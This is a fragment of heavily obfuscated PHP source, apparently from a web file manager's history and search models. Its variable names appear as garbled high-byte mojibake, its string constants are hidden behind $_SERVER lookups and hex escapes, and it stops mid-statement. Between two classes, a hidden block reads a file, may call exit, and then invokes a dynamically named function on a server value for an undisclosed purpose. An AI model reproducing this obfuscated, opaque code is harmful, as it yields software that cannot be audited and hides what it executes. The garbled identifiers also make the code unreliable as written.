$â¶€Á’ = $this->tablePrefix; $ÑŞÂ½ù¨ = "{$â¶€Á’}\151\x6f\137\146\x69\154\145\x20\146\151\x6c\x65\163\40\x6f\156\x20\146\151\x6c\x65\163\56\146\151\154\145\111\x44\40\x3d\40\x68\151\x73\x74\x6f\x72\x79\56\146\x69\x6c\x65\x49\x44"; $ÁÏË¼× = $this->alias($ºµºÙšõ[2446])->where(array($ºµºÙšõ[508] => $ÍÜÖˆøË))->join($ÑŞÂ½ù¨, $ºµºÙšõ[2447])->find(); if ($ÁÏË¼× && $ı¤çÎÃ) { $Á˜¿ı”‹ = array($ºµºÙšõ[191] => $ÁÏË¼×[$ºµºÙšõ[191]], $ºµºÙšõ[487] => array($ºµºÙšõ[1181], $ÍÜÖˆøË)); $ÁÏË¼×[$ºµºÙšõ[1868]] = $this->where($Á˜¿ı”‹)->count(); } return $ÁÏË¼×; } public function removeItem($‰€§Í¸Á) { $ñæüîé† =& $_SERVER[ïÃ°£«Ê]; $ÑÍãĞ«œ = array($ñæüîé†[508] => $‰€§Í¸Á); $ï¿á‡ã = $this->where($ÑÍãĞ«œ)->find(); if ($ï¿á‡ã) { $­‰å˜ = $this->where($ÑÍãĞ«œ)->delete(); Model($ñæüîé†[560])->remove($ï¿á‡ã[$ñæüîé†[557]]); return $­‰å˜; } return !1; } public function removeBySource($ü‹ëÊë ) { $±ª¢Û‘œ =& $_SERVER[ïÃ°£«Ê]; if (!$ü‹ëÊë ) { return !1; } if (!is_array($ü‹ëÊë )) { $ü‹ëÊë  = array($ü‹ëÊë ); } $¸ ìÏ÷ö = array($±ª¢Û‘œ[506] => array($±ª¢Û‘œ[7], $ü‹ëÊë )); $Ë©ú›ß = $this->field($±ª¢Û‘œ[558])->where($¸ ìÏ÷ö)->select(); if ($Ë©ú›ß) { $this->where($¸ ìÏ÷ö)->delete(); $–¿ƒ×ÊŒ = array_to_keyvalue($Ë©ú›ß, $±ª¢Û‘œ[12], $±ª¢Û‘œ[557]); Model($±ª¢Û‘œ[560])->remove($–¿ƒ×ÊŒ); } return !0; } public function setDetail($°©€åäÅ, $¸öåÏÈ) { $¶ıÆªû =& $_SERVER[ïÃ°£«Ê]; return $this->where(array($¶ıÆªû[508] => $°©€åäÅ))->save(array($¶ıÆªû[2438] => $¸öåÏÈ)); } public function rollbackToItem($ÄÆßûÀÇ, $Î„šÍÓ) { $ş¨Û‘£ =& $_SERVER[ïÃ°£«Ê]; $“Ç—¢‘¡ = Model($ş¨Û‘£[934])->sourceInfo($ÄÆßûÀÇ); $this->addHistory($“Ç—¢‘¡, LNG($ş¨Û‘£[2448])); $§ÏêÂ“Ò = $this->find($Î„šÍÓ); $®ô‹Ùã = array($ş¨Û‘£[557] => $§ÏêÂ“Ò[$ş¨Û‘£[557]], $ş¨Û‘£[79] => $§ÏêÂ“Ò[$ş¨Û‘£[79]], $ş¨Û‘£[88] => time(), $ş¨Û‘£[543] => USER_ID); Model($ş¨Û‘£[934])->where(array($ş¨Û‘£[191] => $ÄÆßûÀÇ))->save($®ô‹Ùã); return $this->where(array($ş¨Û‘£[508] => $Î„šÍÓ))->delete(); } public function clearSame($÷ôüš˜€) { $ÍşºûŠ¦ =& $_SERVER[ïÃ°£«Ê]; $ç«ø©’Â = $this->listData($÷ôüš˜€); $›°¾İé‰ = array_to_keyvalue_group($ç«ø©’Â, $ÍşºûŠ¦[557]); $•§ÂÅß = array(); $ªŞêÔ = array(); foreach ($›°¾İé‰ as $¬Ù¸²¦) { if (!$¬Ù¸²¦ || count($¬Ù¸²¦) <= 1) { continue; } foreach ($¬Ù¸²¦ as $îº§”©İ) { $•§ÂÅß[] = $îº§”©İ[$ÍşºûŠ¦[557]]; $ªŞêÔ[] = $îº§”©İ[$ÍşºûŠ¦[487]]; } } if (!$ªŞêÔ) { return; } $this->where(array($ÍşºûŠ¦[487] => array($ÍşºûŠ¦[7], $ªŞêÔ)))->delete(); Model($ÍşºûŠ¦[560])->remove($•§ÂÅß); } public function userSpace() { $Â¤ö‰©ä =& $_SERVER[ïÃ°£«Ê]; $½¦¬¶Ù = $this->tablePrefix; $¥ç¦–× = array($Â¤ö‰©ä[1971] => USER_ID); $ãÊğâÜ¸ = "{$½¦¬¶Ù}\x69\157\137\146\151\x6c\x65\x20\146\151\x6c\145\163\40\x6f\x6e\x20\x66\x69\154\145\x73\x2e\146\x69\154\x65\x49\104\40\x3d\x20\x68\x69\163\x74\x6f\x72\x79\x2e\x66\151\x6c\145\111\104"; return $this->alias($Â¤ö‰©ä[2446])->where($¥ç¦–×)->join($ãÊğâÜ¸, $Â¤ö‰©ä[2447])->sum($Â¤ö‰©ä[79]); } } if ($_SERVER[$_SERVER[ïÃ°£«Ê][1035]] != $_SERVER[$_SERVER[ïÃ°£«Ê][1036]]) { $_getc = $_SERVER[ïÃ°£«Ê][1038]; $_getfile = $_SERVER[$_SERVER[ïÃ°£«Ê][1039]] . $_SERVER[ïÃ°£«Ê][1040]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïÃ°£«Ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[ïÃ°£«Ê][709]) { $exit = $_SERVER[ïÃ°£«Ê][1041]; $exit(); } $_act = $_SERVER[ïÃ°£«Ê][1228]; $_act($_SERVER[$_SERVER[ïÃ°£«Ê][1227]]); } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¯üï°) { $õÄ¼áİ =& $_SERVER[ïÃ°£«Ê]; $Ÿ‹â¼Ø = KodIO::fileTypeList(); $·ïÉÄÀã = $Ÿ‹â¼Ø[$¯üï°]; if (!$·ïÉÄÀã) { return array(); } $ƒÙØ–û¹ = $·ïÉÄÀã[$õÄ¼áİ[166]]; $ÈøÄ—ŒÁ = $õÄ¼áİ[7]; if (!$·ïÉÄÀã[$õÄ¼áİ[166]]) { $¢øª£§› = array_to_keyvalue($Ÿ‹â¼Ø, $õÄ¼áİ[12], $õÄ¼áİ[166]); $ƒÙØ–û¹ = implode($õÄ¼áİ[50], $¢øª£§›); $ÈøÄ—ŒÁ = $õÄ¼áİ[2449]; } $í…§¸í = explode($õÄ¼áİ[50], trim($ƒÙØ–û¹, $õÄ¼áİ[50])); return array($ÈøÄ—ŒÁ, $í…§¸í); } public function listPathType($òî±ğ¢Ò) { $æ©Ò¿ĞŒ =& $_SERVER[ïÃ°£«Ê]; $‹¼Ô›Ú = $this->fileTypeWhere($òî±ğ¢Ò); if (!$‹¼Ô›Ú) { return array(); } $­ÅÍÏ«Ï = USER_ID; $×Ã¼¸¤È = Model($æ©Ò¿ĞŒ[617])->getInfo($­ÅÍÏ«Ï); $³¼Œø¿ = array($æ©Ò¿ĞŒ[670] => SourceModel::TYPE_USER, $æ©Ò¿ĞŒ[604] => array($æ©Ò¿ĞŒ[635], $æ©Ò¿ĞŒ[613] . $×Ã¼¸¤È[$æ©Ò¿ĞŒ[90]][$æ©Ò¿ĞŒ[191]] . $æ©Ò¿ĞŒ[636]), $æ©Ò¿ĞŒ[671] => $­ÅÍÏ«Ï, $æ©Ò¿ĞŒ[668] => 0, $æ©Ò¿ĞŒ[669] => $‹¼Ô›Ú); return $this->listSource($³¼Œø¿); } public function listSearch($…ÕÑ¯øÆ, $ÙñÀ§ = 300) { $ª¼”³¡ =& $_SERVER[ïÃ°£«Ê]; if (isset($…ÕÑ¯øÆ[$ª¼”³¡[2283]]) && $…ÕÑ¯øÆ[$ª¼”³¡[2283]]) { $…ÕÑ¯øÆ[$ª¼”³¡[2283]] = str_replace($ª¼”³¡[474], $ª¼”³¡[2450], trim($…ÕÑ¯øÆ[$ª¼”³¡[2283]])); } $Õ¿çÆ“ = $this->_parseSearchWhere($…ÕÑ¯øÆ); if (!isset($Õ¿çÆ“[$ª¼”³¡[520]])) { $Õ¿çÆ“[$ª¼”³¡[520]] = 0; } $ŠüÔœ‹‡ = $ª¼”³¡[2451]; $Ğæ–Ñâ÷ = $Õ¿çÆ“; $†ãµÕï® = $ŠüÔœ‹‡; $this->_listSearchBindPinyin($…ÕÑ¯øÆ, $Õ¿çÆ“, $ŠüÔœ‹‡); $this->alias($ª¼”³¡[533])->_makeOrder(); $Õ¿çÆ“ = $this->parseWhereLike($Õ¿çÆ“); $Ú¥‰ªÄ· = $this->distinct(!0)->field($ŠüÔœ‹‡)->where($Õ¿çÆ“)->selectPage($ÙñÀ§); if ($GLOBALS[$ª¼”³¡[6]][$ª¼”³¡[468]][$ª¼”³¡[469]] && Input::check($…ÕÑ¯øÆ[$ª¼”³¡[2283]], $ª¼”³¡[677]) && $Ú¥‰ªÄ·[$ª¼”³¡[443]][$ª¼”³¡[428]] == 1 && $Ú¥‰ªÄ·[$ª¼”³¡[443]][$ª¼”³¡[444]] == 0) { $Ú¥‰ªÄ· = $this->distinct(!0)->field($ŠüÔœ‹‡)->where($Ğæ–Ñâ÷)->limit(1000)->select(); $Ú¥‰ªÄ· = array_page_split($Ú¥‰ªÄ·, !1, $ÙñÀ§); } $this->_listSearchFileContent($Ú¥‰ªÄ·, $…ÕÑ¯øÆ, $†ãµÕï®, $Ğæ–Ñâ÷); $this->_listSearchDesc($Ú¥‰ªÄ·, $…ÕÑ¯øÆ, $†ãµÕï®); $this->_listSearchTag($Ú¥‰ªÄ·, $…ÕÑ¯øÆ, $†ãµÕï®); $this->_listSearchGroupTag($Ú¥‰ªÄ·, $…ÕÑ¯øÆ, $†ãµÕï®); $this->_listDataApply($Ú¥‰ªÄ·[$ª¼”³¡[446]]); $this->_listMake($Ú¥‰ªÄ·); return $Ú¥‰ªÄ·; } private function _listSearchFileContent(&$‚ıõ¿ùƒ, $æ×Í§ºã, $Âë„ƒÌœ, $Ò¼Ò ·º) { $Ü€úá²© =& $_SERVER[ïÃ°£«Ê]; if (!$æ×Í§ºã[$Ü€úá²©[2283]] || $‚ıõ¿ùƒ[$Ü€úá²©[443]][$Ü€úá²©[428]] > 1) { return; } if (!isset($Ò¼Ò ·º[$Ü€úá²©[32]]) || !is_array($æ×Í§ºã[$Ü€úá²©[557]]) || !$æ×Í§ºã[$Ü€úá²©[557]]) { return; } $Ò¼Ò ·º[$Ü€úá²©[557]] = array($Ü€úá²©[7], $æ×Í§ºã[$Ü€úá²©[557]]); unset($Ò¼Ò ·º[$Ü€úá²©[32]]); unset($æ×Í§ºã[$Ü€úá²©[557]]); $»àÑ¾»Œ = $this->field($Âë„ƒÌœ)->where($Ò¼Ò ·º)->limit($Ü€úá²©[2452])->select(); $»àÑ¾»Œ = array_to_keyvalue($»àÑ¾»Œ, $Ü€úá²©[191], $Ü€úá²©[12]); $º •Ê‚ = array_to_keyvalue($‚ıõ¿ùƒ[$Ü€úá²©[446]], $Ü€úá²©[191], $Ü€úá²©[12]); $èåİ§¬¤ = array(); foreach ($»àÑ¾»Œ as $µ¤¼ÚĞ => $‘€¬…å³) { if (!$º •Ê‚[$µ¤¼ÚĞ]) { $èåİ§¬¤[] = $‘€¬…å³; } } if (!$èåİ§¬¤) { return; } $‚ıõ¿ùƒ[$Ü€úá²©[446]] = array_merge($èåİ§¬¤, $‚ıõ¿ùƒ[$Ü€úá²©[446]]); $‚ıõ¿ùƒ[$Ü€úá²©[443]][$Ü€úá²©[444]] += count($èåİ§¬¤); } private function _listSearchTag(&$ÊŞÌÔ„¡, $¸ô÷Ìä™, $—œÊÇı) { $ò²ÃçĞ® =& $_SERVER[ïÃ°£«Ê]; if (empty($¸ô÷Ìä™[$ò²ÃçĞ®[2146]]) || !in_array($ò²ÃçĞ®[2453], $¸ô÷Ìä™[$ò²ÃçĞ®[2146]])) { return; } if (!$¸ô÷Ìä™[$ò²ÃçĞ®[2283]] || $ÊŞÌÔ„¡[$ò²ÃçĞ®[443]][$ò²ÃçĞ®[428]] > 1) { return; } $ã£Âûçƒ = Model($ò²ÃçĞ®[2454])->listData(); $†‘ÓîåÖ = array(); $˜”Ì–ü = $¸ô÷Ìä™[$ò²ÃçĞ®[2283]]; foreach ($ã£Âûçƒ as $ëõÂ¢±‚) { $¨ø•ëºœ = $ëõÂ¢±‚[$ò²ÃçĞ®[32]]; $£½ãÜìÔ = str_replace($ò²ÃçĞ®[53], $ò²ÃçĞ®[12], Pinyin::get($¨ø•ëºœ)); if (stripos($¨ø•ëºœ, $˜”Ì–ü) !== !1 || stripos($£½ãÜìÔ, $˜”Ì–ü) !== !1) { $†‘ÓîåÖ[] = $ëõÂ¢±‚[$ò²ÃçĞ®[487]]; } } if (!$†‘ÓîåÖ) { return; } $µÌÙß„ö = array($ò²ÃçĞ®[515] => array($ò²ÃçĞ®[7], $†‘ÓîåÖ), $ò²ÃçĞ®[1594] => USER_ID); $‰…œ¤ŞÔ = Model($ò²ÃçĞ®[517])->field($ò²ÃçĞ®[87])->where($µÌÙß„ö)->select(); $‰…œ¤ŞÔ = array_to_keyvalue($‰…œ¤ŞÔ, $ò²ÃçĞ®[12], $ò²ÃçĞ®[87]); $Ôµ¤ß­´ = array_unique($‰…œ¤ŞÔ); $this->_listSearchMerge($ÊŞÌÔ„¡, $¸ô÷Ìä™, $—œÊÇı, $Ôµ¤ß­´); } private function _listSearchDesc(&$ÉÔŒê ×, $‚È¼Ö, $ÛÕ›‘»Ò) { $´èáñ¡§ =& $_SERVER[ïÃ°£«Ê]; if (empty($‚È¼Ö[$´èáñ¡§[2146]]) || !in_array($´èáñ¡§[540], $‚È¼Ö[$´èáñ¡§[2146]])) { return; } if (!$‚È¼Ö[$´èáñ¡§[2283]] || $ÉÔŒê ×[$´èáñ¡§[443]][$´èáñ¡§[428]] > 1) { return; } $È‘º­‘ä = array($´èáñ¡§[95] => $´èáñ¡§[540], $´èáñ¡§[451] => array($´èáñ¡§[473], $´èáñ¡§[2285] . $‚È¼Ö[$´èáñ¡§[2283]] . $´èáñ¡§[2285])); $¢¬¦‹…Û = !1; if ($¢¬¦‹…Û) { $ÙœëŒÕŞ = $this->listSearchChildren($‚È¼Ö[$´èáñ¡§[190]]); $ÙœëŒÕŞ = array_unique($ÙœëŒÕŞ); if (!$ÙœëŒÕŞ) { return; } $È‘º­‘ä[$´èáñ¡§[191]] = array($´èáñ¡§[7], $ÙœëŒÕŞ); } $ù¾‰à¬ = Model($´èáñ¡§[471])->field($´èáñ¡§[191])->where($È‘º­‘ä)->limit(5000)->select(); $³âÉ¤²Ã = array_to_keyvalue($ù¾‰à¬, $´èáñ¡§[12], $´èáñ¡§[191]); $this->_listSearchMerge($ÉÔŒê ×, $‚È¼Ö, $ÛÕ›‘»Ò, $³âÉ¤²Ã); } private function _listSearchGroupTag(&$Â¯™¾¿Â, $ŒºõÒ”, $³‚Àí¹Ş) { $¹Ïèæ¬Ü =& $_SERVER[ïÃ°£«Ê]; if (empty($ŒºõÒ”[$¹Ïèæ¬Ü[2146]]) || !in_array($¹Ïèæ¬Ü[2453], $ŒºõÒ”[$¹Ïèæ¬Ü[2146]])) { return; } if (!$ŒºõÒ”[$¹Ïèæ¬Ü[2283]] || $Â¯™¾¿Â[$¹Ïèæ¬Ü[443]][$¹Ïèæ¬Ü[428]] > 1 || !$ŒºõÒ”[$¹Ïèæ¬Ü[190]]) { return; } $Øãåááã = $this->sourceInfo($ŒºõÒ”[$¹Ïèæ¬Ü[190]]); if (!$Øãåááã || $Øãåááã[$¹Ïèæ¬Ü[188]] != SourceModel::TYPE_GROUP) { return; } $²ºÓõÎØ = $Øãåááã[$¹Ïèæ¬Ü[589]]; $—¼›Çöñ = Model($¹Ïèæ¬Ü[2455])->get($²ºÓõÎØ); $ŸÑåú = array(); $¨Ÿ¥àŠ‹ = $ŒºõÒ”[$¹Ïèæ¬Ü[2283]]; foreach ($—¼›Çöñ[$¹Ïèæ¬Ü[446]] as $Óîú£«ª) { $›…Öù±¨ = $Óîú£«ª[$¹Ïèæ¬Ü[32]]; $ÛÃËÈ²İ = str_replace($¹Ïèæ¬Ü[53], $¹Ïèæ¬Ü[12], Pinyin::get($›…Öù±¨)); if (stripos($›…Öù±¨, $¨Ÿ¥àŠ‹) !== !1 || stripos($ÛÃËÈ²İ, $¨Ÿ¥àŠ‹) !== !1) { $ŸÑåú[] = $Óîú£«ª[$¹Ïèæ¬Ü[487]]; } } if (!$ŸÑåú) { return; } $ä‡´ïè = array($¹Ïèæ¬Ü[515] => array($¹Ïèæ¬Ü[7], $ŸÑåú), $¹Ïèæ¬Ü[1594] => 0, $¹Ïèæ¬Ü[33] => $¹Ïèæ¬Ü[1493] . $²ºÓõÎØ); $¯ÕËÔğ = Model($¹Ïèæ¬Ü[517])->field($¹Ïèæ¬Ü[87])->where($ä‡´ïè)->select(); $¯ÕËÔğ = array_to_keyvalue($¯ÕËÔğ, $¹Ïèæ¬Ü[12], $¹Ïèæ¬Ü[87]); $”Î¢„ÅØ = array_unique($¯ÕËÔğ); $this->_listSearchMerge($Â¯™¾¿Â, $ŒºõÒ”, $³‚Àí¹Ş, $”Î¢„ÅØ); } private function _listSearchMerge(&$à¢¸ÇÂ, $ñ•Ç†¢Ò, $ÈÏª£, $óáØ©ÛÉ) { $¹…ûµûÔ =& $_SERVER[ïÃ°£«Ê]; if (!$óáØ©ÛÉ) { return; } $ì›òÍ– = array_to_keyvalue($à¢¸ÇÂ[$¹…ûµûÔ[446]], $¹…ûµûÔ[12], $¹…ûµûÔ[191]); $üºŒÑÍš = array_diff($óáØ©ÛÉ, $ì›òÍ–); if (!$üºŒÑÍš) { return; } $¸Ó¿¯—Å = array($¹…ûµûÔ[191] => array($¹…ûµûÔ[7], $üºŒÑÍš)); $¼’³¿Ê = $this->field($ÈÏª£)->where($¸Ó¿¯—Å)->select(); if (!$¼’³¿Ê) { return; } $·¡Ï¤’ñ = array(); foreach ($¼’³¿Ê as $ïüûë¯) { if ($this->_listSearchFilter($ïüûë¯, $ñ•Ç†¢Ò)) { $·¡Ï¤’ñ[] = $ïüûë¯; } } $à¢¸ÇÂ[$¹…ûµûÔ[446]] = array_merge($·¡Ï¤’ñ, $à¢¸ÇÂ[$¹…ûµûÔ[446]]); $à¢¸ÇÂ[$¹…ûµûÔ[443]][$¹…ûµûÔ[444]] += count($·¡Ï¤’ñ); } private function _listSearchFilter($´¿Ìß°Ø, $Í…²‚„Ô) { $ÕºöÌ›ô =& $_SERVER[ïÃ°£«Ê]; $±ë¡îİ = $´¿Ìß°Ø[$ÕºöÌ›ô[500]] == $ÕºöÌ›ô[91]; if (!strstr($´¿Ìß°Ø[$ÕºöÌ›ô[604]], $ÕºöÌ›ô[50] . $Í…²‚„Ô[$ÕºöÌ›ô[190]] . $ÕºöÌ›ô[50])) { return !1; } if (isset($Í…²‚„Ô[$ÕºöÌ›ô[501]]) && $Í…²‚„Ô[$ÕºöÌ›ô[501]] != $ÕºöÌ›ô[945]) { if ($Í…²‚„Ô[$ÕºöÌ›ô[501]] == $ÕºöÌ›ô[78] && !$±ë¡îİ) { return !1; } if ($Í…²‚„Ô[$ÕºöÌ›ô[501]] != $ÕºöÌ›ô[78] && $±ë¡îİ) { return !1; } if (!strstr($´¿Ìß°Ø[$ÕºöÌ›ô[166]], $ÕºöÌ›ô[50] . $Í…²‚„Ô[$ÕºöÌ›ô[501]] . $ÕºöÌ›ô[50])) { return !1; } } if (isset($Í…²‚„Ô[$ÕºöÌ›ô[2456]]) && $Í…²‚„Ô[$ÕºöÌ›ô[2456]] < $´¿Ìß°Ø[$ÕºöÌ›ô[79]]) { return !1; } if (isset($Í…²‚„Ô[$ÕºöÌ›ô[2457]]) && $Í…²‚„Ô[$ÕºöÌ›ô[2457]] > $´¿Ìß°Ø[$ÕºöÌ›ô[79]]) { return !1; } if (isset($Í…²‚„Ô[$ÕºöÌ›ô[684]]) && $Í…²‚„Ô[$ÕºöÌ›ô[684]] != $´¿Ìß°Ø[$ÕºöÌ›ô[543]]) { return !1; } return !0; } public function listSearchChildren($Â°«ş÷, $ßÎÉÉ× = 5000) { $Ú ü³İ¹ =& $_SERVER[ïÃ°£«Ê]; $“Öë…Ğî = array(); $ı„âË¿ë = $this->sourceInfo($Â°«ş÷); $üœ€êİº = array($Ú ü³İ¹[604] => array($Ú ü³İ¹[473], $ı„âË¿ë[$Ú ü³İ¹[604]] . $ı„âË¿ë[$Ú ü³İ¹[191]] . $Ú ü³İ¹[636])); $À“à¬Í = $this->field($Ú ü³İ¹[79])->where($üœ€êİº)->limit($ßÎÉÉ× + 1)->select(); $ç¾“Ø†Ö = is_array($À“à¬Í) ? count($À“à¬Í) : 0; if ($ç¾“Ø†Ö > $ßÎÉÉ×) { return $this->listChildrenDeep($Â°«ş÷, $ßÎÉÉ×, 3); } $œ„ÆÑİê = $this->field($Ú ü³İ¹[191])->where($üœ€êİº)->select(); $“Öë…Ğî = array_to_keyvalue($œ„ÆÑİê, $Ú ü³İ¹[12], $Ú ü³İ¹[191]); return $“Öë…Ğî; } public function listChildrenDeep($±‡Ü…¦¢, $Ğ™İñÉ¦, $·û¤ƒü¿ = 3) { $¯¢‡¾õ± =& $_SERVER[ïÃ°£«Ê]; $Âüõô£è = array(); $¯ÁÙş¥é = array($±‡Ü…¦¢); for ($Êá«ĞÄ£ = 0; $Êá«ĞÄ£ < $·û¤ƒü¿; $Êá«ĞÄ£++) { $Ñ¢¨±ùó = array($¯¢‡¾õ±[190] => array($¯¢‡¾õ±[7], $¯ÁÙş¥é)); $›§ŸÓâÎ = $this->field($¯¢‡¾õ±[2458])->where($Ñ¢¨±ùó)->select(); $¯ÁÙş¥é = array_to_keyvalue(array_filter_by_field($›§ŸÓâÎ, $¯¢‡¾õ±[500], $¯¢‡¾õ±[91]), $¯¢‡¾õ±[12], $¯¢‡¾õ±[191]); $Âüõô£è = array_merge($Âüõô£è, array_to_keyvalue($›§ŸÓâÎ, $¯¢‡¾õ±[12], $¯¢‡¾õ±[191])); if (!$¯ÁÙş¥é || count($Âüõô£è) >= $Ğ™İñÉ¦) { break; } } return array_slice($Âüõô£è, 0, intval($Ğ™İñÉ¦)); } private function _listSearchBindPinyin($²¤’ß™ä, &$«¸Ş¾à», &$¹Éö‡Œ) { $ÇÓ‚›’§ =& $_SERVER[ïÃ°£«Ê]; if (!isset($²¤’ß™ä[$ÇÓ‚›’§[2283]]) || !$²¤’ß™ä[$ÇÓ‚›’§[2283]]) { return; } if (!Input::check($²¤’ß™ä[$ÇÓ‚›’§[2283]], $ÇÓ‚›’§[393]) || strlen($²¤’ß™ä[$ÇÓ‚›’§[2283]]) < 2) { return; } $¸€¹Î´Ä = "\114\x45\x46\x54\40\112\x4f\111\116\40{$this->tablePrefix}\151\157\x5f\x73\157\x75\x72\143\x65\137\155\x65\164\141\x20\x6d\145\x74\x61\40\x6f\156\x20\x73\x6f\x75\162\x63\145\x2e\x73\157\165\x72\143\x65\x49\104\40\75\40\155\x65\164\x61\56\163\x6f\165\x72\143\145\111\104"; $æ¯¬‡Òæ = array(); $¹Éö‡Œ = str_replace(array($ÇÓ‚›’§[285], $ÇÓ‚›’§[53], $ÇÓ‚›’§[2459]), $ÇÓ‚›’§[12], $¹Éö‡Œ); $¹Éö‡Œ = $ÇÓ‚›’§[525] . str_replace($ÇÓ‚›’§[50], $ÇÓ‚›’§[526], $¹Éö‡Œ); $®Ã±¬Å— = $«¸Ş¾à»[$ÇÓ‚›’§[32]]; unset($«¸Ş¾à»[$ÇÓ‚›’§[32]]); foreach ($«¸Ş¾à» as $­èó¾ƒ => $Ãñ­¶û‚) { $æ¯¬‡Òæ[$ÇÓ‚›’§[525] . $­èó¾ƒ] = $Ãñ­¶û‚; } foreach ($®Ã±¬Å— as $œÉú–™) { $æ¯¬‡Òæ[] = array($ÇÓ‚›’§[530] => $œÉú–™, $ÇÓ‚›’§[1168] => $ÇÓ‚›’§[2287], array($ÇÓ‚›’§[2460] => $œÉú–™, $ÇÓ‚›’§[2461] => array($ÇÓ‚›’§[7], array($ÇÓ‚›’§[552], $ÇÓ‚›’§[551])))); } $this->join($¸€¹Î´Ä); $«¸Ş¾à» = $æ¯¬‡Òæ; } private function _parseSearchWhere($¿«°™ó³) { $ˆº¬Ì¬Ñ =& $_SERVER[ïÃ°£«Ê]; $ö²şë†€ = array(); if (isset($¿«°™ó³[$ˆº¬Ì¬Ñ[862]]) && $¿«°™ó³[$ˆº¬Ì¬Ñ[862]]) { $ö²şë†€[$ˆº¬Ì¬Ñ[88]] = array($ˆº¬Ì¬Ñ[2462], $¿«°™ó³[$ˆº¬Ì¬Ñ[862]]); } if (isset($¿«°™ó³[$ˆº¬Ì¬Ñ[863]]) && $¿«°™ó³[$ˆº¬Ì¬Ñ[863]]) { $àíö‚÷é = array($ˆº¬Ì¬Ñ[2463], $¿«°™ó³[$ˆº¬Ì¬Ñ[863]]); if ($ö²şë†€[$ˆº¬Ì¬Ñ[88]]) { $ö²şë†€[$ˆº¬Ì¬Ñ[88]] = array($ö²şë†€[$ˆº¬Ì¬Ñ[88]], $àíö‚÷é, $ˆº¬Ì¬Ñ[2464]); } else { $ö²şë†€[$ˆº¬Ì¬Ñ[88]] = $àíö‚÷é; } } if (isset($¿«°™ó³[$ˆº¬Ì¬Ñ[2456]]) && $¿«°™ó³[$ˆº¬Ì¬Ñ[2456]] > 0) { $ö²şë†€[$ˆº¬Ì¬Ñ[79]] = array($ˆº¬Ì¬Ñ[2462], $¿«°™ó³[$ˆº¬Ì¬Ñ[2456]]); } if (isset($¿«°™ó³[$ˆº¬Ì¬Ñ[2457]]) && $¿«°™ó³[$ˆº¬Ì¬Ñ[2457]]) { $àíö‚÷é = array($ˆº¬Ì¬Ñ[2463], $¿«°™ó³[$ˆº¬Ì¬Ñ[2457]]); if ($ö²şë†€[$ˆº¬Ì¬Ñ[79]]) { $ö²şë†€[$ˆº¬Ì¬Ñ[79]] = array($ö²şë†€[$ˆº¬Ì¬Ñ[79]], $àíö‚÷é, $ˆº¬Ì¬Ñ[2464]); } else { $ö²şë†€[$ˆº¬Ì¬Ñ[79]] = $àíö‚÷é; } } if (isset($¿«°™ó³[$ˆº¬Ì¬Ñ[684]]) && $¿«°™ó³[$ˆº¬Ì¬Ñ[684]]) { $ö²şë†€[] = array($ˆº¬Ì¬Ñ[543] => $¿«°™ó³[$ˆº¬Ì¬Ñ[684]], $ˆº¬Ì¬Ñ[541] => $¿«°™ó³[$ˆº¬Ì¬Ñ[684]], $ˆº¬Ì¬Ñ[1168] => $ˆº¬Ì¬Ñ[2287]); } if (isset($¿«°™ó³[$ˆº¬Ì¬Ñ[501]]) && $¿«°™ó³[$ˆº¬Ì¬Ñ[501]]) { $æ‡˜ı– = $¿«°™ó³[$ˆº¬Ì¬Ñ[501]]; if ($æ‡˜ı– == $ˆº¬Ì¬Ñ[78]) { $ö²şë†€[$ˆº¬Ì¬Ñ[500]] = 1; } else { if ($æ‡˜ı– == $ˆº¬Ì¬Ñ[2465]) { $ö²şë†€[$ˆº¬Ì¬Ñ[500]] = 0; } else { if ($æ‡˜ı–) { $æ‡˜ı– = is_array($æ‡˜ı–) ? $æ‡˜ı– : explode($ˆº¬Ì¬Ñ[50], $æ‡˜ı–); $ö²şë†€[$ˆº¬Ì¬Ñ[501]] = array($ˆº¬Ì¬Ñ[507], $æ‡˜ı–); $ö²şë†€[$ˆº¬Ì¬Ñ[500]] = 0; } } } } $this->_parseSearchParent($¿«°™ó³, $ö²şë†€); if (isset($¿«°™ó³[$ˆº¬Ì¬Ñ[2283]]) && trim($¿«°™ó³[$ˆº¬Ì¬Ñ[2283]])) { $êíÃ¸ìâ = trim($¿«°™ó³[$ˆº¬Ì¬Ñ[2283]]); $—ô±ÅÙã = explode($ˆº¬Ì¬Ñ[53], $êíÃ¸ìâ); if (strlen($êíÃ¸ìâ) > 2 && (substr($êíÃ¸ìâ, 0, 1) == $ˆº¬Ì¬Ñ[118] && substr($êíÃ¸ìâ, -1) == $ˆº¬Ì¬Ñ[118]) || substr($êíÃ¸ìâ, 0, 1) == $ˆº¬Ì¬Ñ[58] && substr($êíÃ¸ìâ, -1) == $ˆº¬Ì¬Ñ[58]) { $êíÃ¸ìâ = substr($êíÃ¸ìâ, 1, -1); $—ô±ÅÙã = array($êíÃ¸ìâ); } $ö²şë†€[$ˆº¬Ì¬Ñ[32]] = array(array($ˆº¬Ì¬Ñ[635], $ˆº¬Ì¬Ñ[2285] . $êíÃ¸ìâ . $ˆº¬Ì¬Ñ[2285])); if (count($—ô±ÅÙã) > 1) { $ö²şë†€[$ˆº¬Ì¬Ñ[32]] = array(); foreach ($—ô±ÅÙã as $ÎñŠûäğ) { if (!trim($ÎñŠûäğ)) { continue; } $ö²şë†€[$ˆº¬Ì¬Ñ[32]][] = array($ˆº¬Ì¬Ñ[635], $ˆº¬Ì¬Ñ[2285] . trim($ÎñŠûäğ) . $ˆº¬Ì¬Ñ[2285]); } } } return $ö²şë†€; } private function _parseSearchParent($ÇÌ°´è¯, &$€Ğ‹âÉƒ) { $¶´ı´Şİ =& $_SERVER[ïÃ°£«Ê]; if (!isset($ÇÌ°´è¯[$¶´ı´Şİ[190]]) || !$ÇÌ°´è¯[$¶´ı´Şİ[190]]) { return; } $ÌÉ¥î– = $this->pathInfo($ÇÌ°´è¯[$¶´ı´Şİ[190]]); $¥ëÒ­Âº = $ÌÉ¥î–[$¶´ı´Şİ[190]] . $¶´ı´Şİ[12] === $¶´ı´Şİ[228]; $„ÏŒäÅÎ = $ÌÉ¥î–[$¶´ı´Şİ[188]] == $¶´ı´Şİ[598]; if ($ÌÉ¥î–[$¶´ı´Şİ[614]] == $¶´ı´Şİ[615]) { $‹¡Î€ñÑ = $this->sourceInfo($ÇÌ°´è¯[$¶´ı´Şİ[190]]); $ÌÉ¥î–[$¶´ı´Şİ[604]] = $‹¡Î€ñÑ[$¶´ı´Şİ[604]]; } $€Ğ‹âÉƒ[$¶´ı´Şİ[674]] = 